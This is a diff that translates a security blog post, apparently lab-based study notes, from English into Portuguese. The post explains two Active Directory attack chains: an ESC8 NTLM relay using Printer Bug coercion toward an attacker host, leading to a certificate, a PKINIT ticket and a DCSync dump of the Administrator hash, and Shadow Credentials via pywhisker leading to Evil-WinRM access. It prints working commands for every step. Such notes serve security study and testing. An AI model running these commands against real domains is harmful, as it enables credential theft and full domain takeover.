@@ -1,27 +1,27 @@
 ---
 title: "Pass the Certificate"
 date: 2026-08-07 10:00:00 -0300
-categories: [Concepts, Windows]
+categories: [Conceitos, Windows]
 tags: [windows, kerberos, pkinit, pass-the-certificate, esc8, shadow-credentials, pywhisker, ntlmrelayx, dcsync, pass-the-ticket, evil-winrm]
 ---
 
-**PKINIT** (Public Key Cryptography for Initial Authentication) extends Kerberos to support public-key authentication, while **Pass-the-Certificate** uses X.509 certificates to obtain TGTs, commonly in **AD CS** and **Shadow Credentials** attacks.
+O **PKINIT** (Public Key Cryptography for Initial Authentication) estende o Kerberos para suportar autenticação por chave pública, enquanto o **Pass-the-Certificate** usa certificados X.509 para obter TGTs, comumente em ataques de **AD CS** e **Shadow Credentials**.
 
-## AD CS NTLM Relay Attack (ESC8)
+## Ataque de NTLM Relay contra o AD CS (ESC8)
 
-**ESC8** is an **NTLM relay attack** against **AD CS Web Enrollment**, an HTTP-based certificate enrollment endpoint. By relaying a coerced account's NTLM authentication to this endpoint, an attacker can request a certificate on that account's behalf and later use it to obtain a Kerberos TGT through PKINIT. Tools such as **Impacket's `ntlmrelayx`** automate this by listening for incoming NTLM connections and forwarding them to the vulnerable enrollment endpoint.
+O **ESC8** é um **ataque de NTLM relay** contra o **AD CS Web Enrollment**, um endpoint de inscrição de certificados baseado em HTTP. Ao repassar (relay) a autenticação NTLM de uma conta coagida para esse endpoint, um atacante consegue solicitar um certificado em nome dessa conta e depois usá-lo para obter um TGT Kerberos via PKINIT. Ferramentas como o **`ntlmrelayx` do Impacket** automatizam esse processo, escutando conexões NTLM recebidas e as repassando para o endpoint de inscrição vulnerável.
 
 ```bash
 impacket-ntlmrelayx -t http://<DOMAIN>/certsrv/certfnsh.asp --adcs -smb2support --template KerberosAuthentication
 ```
 
-NTLM authentication attempts can be captured passively or actively coerced. One common method is the [Printer Bug](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py), which abuses the **Print Spooler** service to force a machine account, such as a Domain Controller, to authenticate to an arbitrary host:
+Tentativas de autenticação NTLM podem ser capturadas passivamente ou coagidas ativamente. Um método comum é o [Printer Bug](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py), que abusa do serviço **Print Spooler** para forçar uma conta de computador, como um Domain Controller, a se autenticar num host arbitrário:
 
 ```bash
 python3 printerbug.py INLANEFREIGHT.LOCAL/<USER>:"<PASSWORD>"@<DC_IP> <ATTACKER_IP>
 ```
 
-Once the certificate for `DC01$` is obtained, `gettgtpkinit.py` uses it to perform **Pass-the-Certificate** and request a TGT for the domain controller's machine account:
+Assim que o certificado de `DC01$` é obtido, o `gettgtpkinit.py` o usa para realizar **Pass-the-Certificate** e solicitar um TGT para a conta de computador do domain controller:
 
 ```bash
 python3 gettgtpkinit.py \
@@ -31,13 +31,13 @@ python3 gettgtpkinit.py \
   /tmp/dc.ccache
 ```
 
-Loading the resulting ccache file via `KRB5CCNAME` enables **Pass-the-Ticket** authentication:
+Carregar o arquivo ccache resultante via `KRB5CCNAME` permite autenticação por **Pass-the-Ticket**:
 
 ```bash
 export KRB5CCNAME=/tmp/dc.ccache
 ```
 
-Because `DC01$` has sufficient privileges, the ticket can then be used to perform a **DCSync** attack and retrieve sensitive domain credentials, such as the NTLM hash of `Administrator`:
+Como `DC01$` tem privilégios suficientes, o ticket pode então ser usado para realizar um ataque de **DCSync** e recuperar credenciais sensíveis do domínio, como o hash NTLM do `Administrator`:
 
 ```bash
 impacket-secretsdump \
@@ -48,13 +48,13 @@ impacket-secretsdump \
   'INLANEFREIGHT.LOCAL/DC01$'@DC01.INLANEFREIGHT.LOCAL
 ```
 
-**Attack chain**: Coerced authentication (Printer Bug) → NTLM Relay (ESC8) → Certificate → PKINIT → TGT → Pass-the-Ticket → DCSync.
+**Cadeia de ataque**: Autenticação coagida (Printer Bug) → NTLM Relay (ESC8) → Certificado → PKINIT → TGT → Pass-the-Ticket → DCSync.
 
 ## Shadow Credentials (msDS-KeyCredentialLink)
 
-**Shadow Credentials** abuses the `msDS-KeyCredentialLink` attribute in Active Directory, which stores public keys used for PKINIT authentication. An attacker with write access to this attribute on a target account — represented in BloodHound by the `AddKeyCredentialLink` edge — can add their own key material and effectively authenticate as that user.
+O **Shadow Credentials** abusa do atributo `msDS-KeyCredentialLink` no Active Directory, que armazena chaves públicas usadas para autenticação PKINIT. Um atacante com acesso de escrita a esse atributo numa conta alvo — representado no BloodHound pela aresta `AddKeyCredentialLink` — consegue adicionar seu próprio material de chave e, na prática, se autenticar como esse usuário.
 
-Using `pywhisker`, the attacker generates an X.509 certificate and adds its public key to the target's `msDS-KeyCredentialLink`, producing a `.pfx` file that can be used for authentication:
+Usando o `pywhisker`, o atacante gera um certificado X.509 e adiciona sua chave pública ao `msDS-KeyCredentialLink` do alvo, produzindo um arquivo `.pfx` que pode ser usado para autenticação:
 
 ```bash
 pywhisker \
@@ -66,7 +66,7 @@ pywhisker \
   --action add
 ```
 
-The generated PFX certificate is supplied to `gettgtpkinit.py` to obtain a TGT for the target account, which can then be loaded via `KRB5CCNAME` for Pass-the-Ticket, the same way as before:
+O certificado PFX gerado é fornecido ao `gettgtpkinit.py` para obter um TGT para a conta alvo, que pode então ser carregado via `KRB5CCNAME` para Pass-the-Ticket, da mesma forma que antes:
 
 ```bash
 python3 gettgtpkinit.py \
@@ -82,10 +82,10 @@ export KRB5CCNAME=/tmp/<TARGET_USER>.ccache
 klist
 ```
 
-If the target account has appropriate privileges, such as membership in **Remote Management Users**, the ticket can be used for Kerberos authentication through **Evil-WinRM**:
+Se a conta alvo tiver privilégios apropriados, como participação no grupo **Remote Management Users**, o ticket pode ser usado para autenticação Kerberos através do **Evil-WinRM**:
 
 ```bash
 evil-winrm -i dc01.inlanefreight.local -r inlanefreight.local
 ```
 
-**Attack chain**: Write access to `msDS-KeyCredentialLink` → Shadow Credentials → Certificate → PKINIT → TGT → Pass-the-Ticket → Access as the victim.
+**Cadeia de ataque**: Acesso de escrita ao `msDS-KeyCredentialLink` → Shadow Credentials → Certificado → PKINIT → TGT → Pass-the-Ticket → Acesso como a vítima.
